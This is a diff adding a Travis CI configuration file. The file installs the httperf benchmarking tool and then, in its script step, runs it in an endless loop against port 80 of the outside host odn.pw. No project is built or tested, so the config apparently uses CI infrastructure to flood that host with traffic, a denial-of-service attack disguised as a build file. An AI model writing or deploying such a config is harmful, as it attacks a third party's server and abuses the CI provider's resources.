@@ -1,0 +1,7 @@
+dist: trusty
+sudo: required
+before_script:
+- sudo apt-get update -qq
+- sudo apt-get install httperf
+script:
+- while true ; do sudo httperf --server odn.pw --port 80 --num-conns=10 --rate=10 ; done
